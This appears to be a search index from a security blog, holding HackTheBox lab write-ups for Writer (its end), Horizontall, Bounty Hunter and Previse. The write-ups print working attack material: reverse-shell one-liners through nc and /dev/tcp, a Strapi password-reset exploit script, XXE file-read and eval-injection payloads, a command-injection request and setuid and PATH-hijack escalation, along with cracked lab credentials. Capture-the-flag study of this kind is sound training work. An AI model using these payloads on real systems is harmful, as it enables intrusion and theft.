7- cat /etc/mysql/mariadb.cnf:\n[client] database = dev user = djangouser \u0026lt;-- password = DjangoSuperPassword \u0026lt;-- default-character-set = utf8 8- Download the Flask source code init.py. DB credentials for DB writer:\nadmin \u0026lt;-- ToughPasswordToCrack \u0026lt;-- 9- Crack kyle hash:\nmysql -u admin -D writer -h 127.0.0.1 -p --\u0026gt; nothing interesting mysql -u djangouser -D dev -h 127.0.0.1 -p # kyle:pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= hashcat -a 0 -m 10000 hash.txt /usr/share/wordlists/rockyou.txt # kyle:marcoantonio user.txt: 332b462c2b9d80d732ae0356922ec7c6\nPrivilege escalation 10- Modify /etc/postfix/disclaimer exploit. There is a postfix user. Why the user who runs the disclaimer script is john?\n#!/bin/bash # Localize these. bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.44/1234 0\u0026gt;\u0026amp;1 INSPECT_DIR=/var/spool/filter SENDMAIL=/usr/sbin/sendmail # Get disclaimer addresses DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses # Exit codes from \u0026lt;sysexits.h\u0026gt; EX_TEMPFAIL=75 EX_UNAVAILABLE=69 # Clean up when done or when aborting. trap \u0026#34;rm -f in.$$\u0026#34; 0 1 2 3 15 # Start processing. cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit $EX_TEMPFAIL; } cat \u0026gt;in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; } # obtain From address from_address=`grep -m 1 \u0026#34;From:\u0026#34; in.$$ | cut -d \u0026#34;\u0026lt;\u0026#34; -f 2 | cut -d \u0026#34;\u0026gt;\u0026#34; -f 1` if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then /usr/bin/altermime --input=in.$$ \\  --disclaimer=/etc/postfix/disclaimer.txt \\  --disclaimer-html=/etc/postfix/disclaimer.txt \\  --xheader=\u0026#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm\u0026#34; || \\  { echo Message content rejected; exit $EX_UNAVAILABLE; } fi $SENDMAIL \u0026#34;$@\u0026#34; \u0026lt;in.$$ exit $? 11- Apt privesc. See HackingArticles. /etc/apt/apt.conf.d/ is writable by management group (john).\nPlace exp (file) in /etc/apt/apt.conf.d/ and wait.\nnc -nlvp 1234 The exp file is:\napt::Update::Pre-Invoke { \u0026#34;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2\u0026gt;\u0026amp;1 | nc 10.10.14.44 1234 \u0026gt; /tmp/f\u0026#34; }; root.txt: 210339aaef5e0225ff2fc6e0677ee7cc\n ", 
            "url": "\/labs\/writer\/"
        },
        
        
        
        "\/labs\/horizontall\/": {
            
            "title": "Horizontall - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  Part of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap discovered 80 and 22.\n2- The webpage index.html doesn\u0026rsquo;t seem to be interactive. Enumerate web server with Nikto and inspect the JS files.\nnikto -h horizontall.htb Vue.js v2.6.12 vue-router v3.5.1 portal-vue 2.1.7 (Although I doubt front end is any juicy to attack\u0026hellip;)\nnginx/1.14.0 (Ubuntu) 3- nginx 1.14.0 has vulnerabilities that allow RCE: CVE-2021-23017\u0026gt; https://www.cybersecurity-help.cz/exploits/53543/?ref=bulletin \u0026ndash;\u0026gt; but requires that the victim nginx is capable of resolving dns names (the dns resolver feature is not on by default)\n4- Fuzz the websit for virtual hosts.\nwfuzz -u \u0026#39;http://horizontall.htb/FUZZ\u0026#39; -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc=404 ffuf -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -H \u0026#34;Host: FUZZ.horizontall.htb\u0026#34; Found: api-prod.horizontall.htb\nFuzz paths.\nffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/FUZZ Found: /reviews, /users, /admin -\u0026gt; /admin/auth/login\n/reviews \u0026ndash;\u0026gt; json of reviews \u0026ndash;\u0026gt; username enumeration: john, doe, wails /admin/auth/login \u0026ndash;\u0026gt; check valid email with forgot password request, admin@horizontall.htb is valid /users \u0026ndash;\u0026gt; 403\n5- Google strapi.\ncurl http://api-prod.horizontall.htb/admin/strapiversion # {\u0026#34;strapiVersion\u0026#34;:\u0026#34;3.0.0-beta.17.4\u0026#34;} There is an authentication bypass bug at CVE-2019-18818. strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.\npython3 strapi-exploit.py admin@horizontall.htb http://api-prod.horizontall.htb 1234567890 Where strapi-exploit.py is:\nimport requests import sys import json args=sys.argv if len(args) \u0026lt; 4: print(\u0026#34;Usage: {}\u0026lt;admin_email\u0026gt; \u0026lt;url\u0026gt; \u0026lt;new_password\u0026gt;\u0026#34;.format(args[0])) exit(-1) email = args[1] url = args[2] new_password = args[3] s = requests.Session() version = json.loads(s.get(\u0026#34;{}/admin/strapiVersion\u0026#34;.format(url)).text) print(\u0026#34;[*] Detected version(GET /admin/strapiVersion): {}\u0026#34;.format(version[\u0026#34;strapiVersion\u0026#34;])) #Request password reset print(\u0026#34;[*] Sending password reset request...\u0026#34;) reset_request={\u0026#34;email\u0026#34;:email, \u0026#34;url\u0026#34;:\u0026#34;{}/admin/plugins/users-permissions/auth/reset-password\u0026#34;.format(url)} s.post(\u0026#34;{}/\u0026#34;.format(url), json=reset_request) #Reset password to print(\u0026#34;[*] Setting new password...\u0026#34;) exploit={\u0026#34;code\u0026#34;:{}, \u0026#34;password\u0026#34;:new_password, \u0026#34;passwordConfirmation\u0026#34;:new_password} r=s.post(\u0026#34;{}/admin/auth/reset-password\u0026#34;.format(url), json=exploit) print(\u0026#34;[*] Response:\u0026#34;) print(str(r.content)) 6- Now that I have admin dashboard access, let\u0026rsquo;s see if I can get RCE. I can upload files and I can install plugins (remember the Moodle one?). Do command injection in plugin parameter and listen for the reverse shell.\ncurl -i -s -k -X $\u0026#39;POST\u0026#39; -H $\u0026#39;Host: api-prod.horizontall.htb\u0026#39; -H $\u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzU1NDc0LCJleHAiOjE2MzI5NDc0NzR9.rBvt5WdIGjI1Bqy6gwTOG2S5bwLERaaeZPYWOXPoL7A\u0026#39; -H $\u0026#39;Content-Type: application/json\u0026#39; -H $\u0026#39;Origin: http://localhost:1337\u0026#39; -H $\u0026#39;Connection: close\u0026#39; --data $\u0026#39;{\\\u0026#34;plugin\\\u0026#34;:\\\u0026#34;documentation \u0026amp;\u0026amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.75 4444 \u0026gt;/tmp/f)\\\u0026#34;,\\\u0026#34;port\\\u0026#34;:\\\u0026#34;1337\\\u0026#34;}\u0026#39; $\u0026#39;http://api-prod.horizontall.htb/admin/plugins/install\u0026#39; Using the shell, we can get the /etc/passwd and in /opt/strapi/myapi/config/environments we can find database.json with MySQL credentials.\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin developer:x:1000:1000:hackthebox:/home/developer:/bin/bash mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false strapi:x:1001:1001::/opt/strapi:/bin/sh { \u0026#34;defaultConnection\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;connections\u0026#34;: { \u0026#34;default\u0026#34;: { \u0026#34;connector\u0026#34;: \u0026#34;strapi-hook-bookshelf\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;client\u0026#34;: \u0026#34;mysql\u0026#34;, \u0026#34;database\u0026#34;: \u0026#34;strapi\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: 3306, \u0026#34;username\u0026#34;: \u0026#34;developer\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;#J!:F9Zt2u\u0026#34; }, \u0026#34;options\u0026#34;: {} } } } Privilege escalation 7- Tried reusing mysql creds for developer but it was unsuccessful. Maybe can get the creds from mysql database. Nope.\nmysql -u developer -p \u0026#39;#J!:F9Zt2u\u0026#39; 8- View listening ports.\nnetstat -nato There is a Laravel page: Laravel v8 (PHP v7.4.18) at http://localhost:8000. There is a PHAR deserialization CVE that allows RCE: CVE-2021-3129. https://github.com/zhzyker/CVE-2021-3129.\n9- python3 exp.py http://localhost:8000/ \u0026quot;system('/bin/bash');\u0026quot; but change exp.py with https://github.com/crisprss/Laravel_CVE-2021-3129_EXP.\nroot.txt: 095ff8dc5f20b8e1aef209106c989d0c\n ", 
            "url": "\/labs\/horizontall\/"
        },
        
        
        
        "\/labs\/bounty_hunter\/": {
            
            "title": "Bounty Hunter - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.\nFoothold 1- Nmap discovers ports 22 and 80.\n# Nmap 7.91 scan initiated Mon Aug 2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb Nmap scan report for bountyhunter.htb (10.10.11.100) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 2 03:25:06 2021 -- 1 IP address (1 host up) scanned in 159.69 seconds 2- Web clues: 1- Copyright name is John \u0026ndash;\u0026gt; potential username. 2- Machine owner is a BurpSuite user. 3- HTML comments suggest we can configure the contact form email address by editing mail/contact_me.php line 19 4- 404 assets/mail/contact_me.js 5- Debugger files: resources folder \u0026ndash;\u0026gt; README.txt is a TODO list of things to fix \u0026ndash;\u0026gt; \u0026lsquo;test\u0026rsquo; account, unhashed passwords, NOPASS enabled on DB, tracker.php not connected to DB. Because the DB port is not open, this is useless. 6- Portal under development at log_submit.php.\n3- XSS failed at log_submit.php.\n4- Inspect log_submit.php: bountySubmit() -\u0026gt; see /resources/bountylog.js\nfunction returnSecret(data) { return Promise.resolve($.ajax({ type: \u0026#34;POST\u0026#34;, data: {\u0026#34;data\u0026#34;:data}, url: \u0026#34;tracker_diRbPr00f314.php\u0026#34; })); } async function bountySubmit() { try { var xml = `\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;${$(\u0026#39;#exploitTitle\u0026#39;).val()}\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;${$(\u0026#39;#cwe\u0026#39;).val()}\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;${$(\u0026#39;#cvss\u0026#39;).val()}\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;${$(\u0026#39;#reward\u0026#39;).val()}\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt;` let data = await returnSecret(btoa(xml)); $(\u0026#34;#return\u0026#34;).html(data) } catch(error) { console.log(\u0026#39;Error:\u0026#39;, error); } } 5- XXE XML external entity injection to read db.php. Use the PHP filter to read arbitrary files:\nphp://filter/convert.base64-encode/resource=/var/www/html/db.php Use the web developer console to run these commands that mimic a bounty submission.\nvar xml = `\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=/var/www/html/db.php\u0026#34;\u0026gt;] \u0026gt; \u0026lt;bugreport\u0026gt;\u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt;\u0026lt;cwe\u0026gt;T\u0026lt;/cwe\u0026gt;\u0026lt;cvss\u0026gt;T\u0026lt;/cvss\u0026gt;\u0026lt;reward\u0026gt;T\u0026lt;/reward\u0026gt;\u0026lt;/bugreport\u0026gt;` let data = returnSecret(btoa(xml)) It returns:\nPromise { \u0026lt;state\u0026gt;: \u0026#34;fulfilled\u0026#34;, \u0026lt;value\u0026gt;: \u0026#34;If DB were ready, would have added:\\n\u0026lt;table\u0026gt;\\n \u0026lt;tr\u0026gt;\\n \u0026lt;td\u0026gt;Title:\u0026lt;/td\u0026gt;\\n \u0026lt;td\u0026gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=\u0026lt;/td\u0026gt;\\n \u0026lt;/tr\u0026gt;\\n \u0026lt;tr\u0026gt;\\n \u0026lt;td\u0026gt;CWE:\u0026lt;/td\u0026gt;\\n \u0026lt;td\u0026gt;T\u0026lt;/td\u0026gt;\\n \u0026lt;/tr\u0026gt;\\n \u0026lt;tr\u0026gt;\\n \u0026lt;td\u0026gt;Score:\u0026lt;/td\u0026gt;\\n \u0026lt;td\u0026gt;T\u0026lt;/td\u0026gt;\\n \u0026lt;/tr\u0026gt;\\n \u0026lt;tr\u0026gt;\\n \u0026lt;td\u0026gt;Reward:\u0026lt;/td\u0026gt;\\n \u0026lt;td\u0026gt;T\u0026lt;/td\u0026gt;\\n \u0026lt;/tr\u0026gt;\\n\u0026lt;/table\u0026gt;\\n\u0026#34; } 6- Decode base64 of /var/www/html/db.php.\n\u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver = \u0026#34;localhost\u0026#34;; $dbname = \u0026#34;bounty\u0026#34;; $dbusername = \u0026#34;admin\u0026#34;; $dbpassword = \u0026#34;m19RoAU0hP41A1sTsq6K\u0026#34;; // --\u0026gt; useful for password reuse $testuser = \u0026#34;test\u0026#34;; ?\u0026gt;7- Use XXE to read /etc/passwd. See passwd file. The only users with /bin/bash are root and development. Reuse the dbpassword to ssh into them. Get user.txt.\npasswd:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin Privilege escalation 8- Read contract.txt. Clues are: \u0026lsquo;I set up the permissions for you to test this.\u0026rsquo;. Let\u0026rsquo;s see the permissions with sudo -l. I can run python tickerValidator.py with sudo.\n9- Potentials privesc ways: snap lxd privesc, sudo NOPASSWD python ticketValidator.py.\n#Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(\u0026#34;.md\u0026#34;): return open(loc, \u0026#39;r\u0026#39;) else: print(\u0026#34;Wrong file type.\u0026#34;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\u0026#34;# Skytrain Inc\u0026#34;): return False continue if i == 1: if not x.startswith(\u0026#34;## Ticket to \u0026#34;): return False print(f\u0026#34;Destination: {\u0026#39; \u0026#39;.join(x.strip().split(\u0026#39; \u0026#39;)[3:])}\u0026#34;) continue if x.startswith(\u0026#34;__Ticket Code:__\u0026#34;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\u0026#34;**\u0026#34;): return False ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) if validationNumber \u0026gt; 100: return True else: return False return False def main(): fileName = input(\u0026#34;Please enter the path to the ticket file.\\n\u0026#34;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\u0026#34;Valid ticket.\u0026#34;) else: print(\u0026#34;Invalid ticket.\u0026#34;) ticket.close main() 10- Exploit the eval() statement to include __import__('os').system('/bin/bash'). Hand craft a ticket.md.\n# Skytrain Inc ## Ticket to __Ticket Code:__ **102+ 10 == 112 and __import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /root/root.txt\u0026#39;) == False 11- Use the hand-crafted ticket to get root shell.\npython ticketValidator.py ticket.md ", 
            "url": "\/labs\/bounty_hunter\/"
        },
        
        
        
        "\/labs\/previse\/": {
            
            "title": "Previse - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.\nPart of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap discovers tcp 22 and 80 ports.\n# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb Nmap scan report for previse.htb (10.10.11.104) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Aug 12 05:17:04 2021 -- 1 IP address (1 host up) scanned in 491.95 seconds 2- http://previse.htb/login.php is a login page. Intercept POST packet with filled parameters to login.php and save it to request.txt.\nTry with SQLi:\nsqlmap -r request.txt -p password # (try with username param too) No SQLi flaws discovered by sqlmap.\n3- Fuzz the request path.\nwfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc=404 http://previse.htb Interesting files:\nindex.php -- 302 Found --\u0026gt; RESPONSE1 (see step 4 for details) login.php config.php download.php -- 302 --\u0026gt; login.php header.php footer.php status.php -- 302 --\u0026gt; MySQL server is running! nav.php accounts.php -- 302 --\u0026gt; Create an admin account files.php -- 302 --\u0026gt; backup.zip YEAH!!! Site backups are very welcome! 4- Intercept request packet with BurpSuite and intercept the response. See annotations above.\nRESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).\n5- The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php.\n\u0026lt;?php function connectDB(){ $host = \u0026#39;localhost\u0026#39;; $user = \u0026#39;root\u0026#39;; $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;; $db = \u0026#39;previse\u0026#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u0026gt;MySQL credentials:\nroot mySQL_p@ssw0rd!:) DBname: previse But we can only access the database from localhost\u0026hellip; Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it\u0026rsquo;s specific to MySQL service.\n6- Revise all files in the site backup folder. Look at logs.php. exec() promises a command injection opportunity.\n\u0026lt;?php if (!$_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;) { header(\u0026#39;Location: login.php\u0026#39;); exit; } ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// /////////////////////////////////////////////////////////////////////////////////////  $output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; $filepath = \u0026#34;/var/www/out.log\u0026#34;; $filename = \u0026#34;out.log\u0026#34;; if(file_exists($filepath)) { header(\u0026#39;Content-Description: File Transfer\u0026#39;); header(\u0026#39;Content-Type: application/octet-stream\u0026#39;); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#34;\u0026#39;.basename($filepath).\u0026#39;\u0026#34;\u0026#39;); header(\u0026#39;Expires: 0\u0026#39;); header(\u0026#39;Cache-Control: must-revalidate\u0026#39;); header(\u0026#39;Pragma: public\u0026#39;); header(\u0026#39;Content-Length: \u0026#39; . filesize($filepath)); ob_clean(); // Discard data in the output buffer  flush(); // Flush system headers  readfile($filepath); die(); } else { http_response_code(404); die(); } ?\u0026gt;The interesting part is here:\n$output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; We can trigger a reverse shell.\nTarget command:\npython log_process.py comma;python3 -c \u0026#39;import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;ATTACKER_IP\u0026#34;,ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Change the POST param in Burpsuite:\nPOST /logs.php HTTP/1.1 Host: previse.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 11 Origin: http://previse.htb DNT: 1 Connection: close Referer: http://previse.htb/file_logs.php Cookie: PHPSESSID=irv4p251afkcliqfqp41f03jbe Upgrade-Insecure-Requests: 1 Sec-GPC: 1 delim=comma;python3+-c+'import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.0.0.1\u0026quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026quot;/bin/bash\u0026quot;)' 7- To escalate from a www-data account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:\nmysql -u root -p Enter password: mySQL_p@ssw0rd!:) \u0026gt; use previse; \u0026gt; show tables; # accounts and files \u0026gt; select * from accounts; # columns id, username, password and created_at So, the username is m4lwhere and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.\nhashcat -a 0 -m 500 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Same but with \u0026ndash;show:\nusername = m4lwhere hash = $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. password = ilovecody112235! Note that john doesn\u0026rsquo;t support non-printable characters in hash.\n8- SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f\nPrivilege escalation 9- sudo -l reveals the script /opt/scripts/access_backup.sh.\n10- Copy to local machine:\nscp m4lwhere@previse.htb:/opt/scripts/access_backup.sh . By looking at this file, we find command path vulnerability.\n#!/bin/bash  # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz 11- We can put a script named gzip in the current workdir and execute access_backup.sh as root.\ncd /tmp # set gzip to be bash with setuid bit cat \u0026lt;\u0026lt; EOF \u0026gt; gzip #!/bin/bash cp /bin/bash /tmp/c chmod u+s /tmp/c EOF 12- Now /tmp/c is a setuid bash.\n/tmp/c -p # this flag sets the real userid as the effective userid root.txt: 23c44ab8465e7ff51a5fab75847e088b\n ", 
            "url": "\/labs\/previse\/"
        },
        
        
        
        "\/research\/": {
            
            "title": "Researches",
            "tags": [],
            "content": "", 
            "url": "\/research\/"
        },
        
        
        
        "\/research\/test\/": {
            
            "title": "Test",
            "tags": [],
            "content": "", 
            "url": "\/research\/test\/"
        },
        
        
        
        "\/general\/": {
            
            "title": "Generals",
            "tags": [],
            "content": "", 
            "url": "\/general\/"
        },
        
        
        
        "\/general\/migration\/": {
            
            "title": "Migration from previous blog",
            "tags": [],
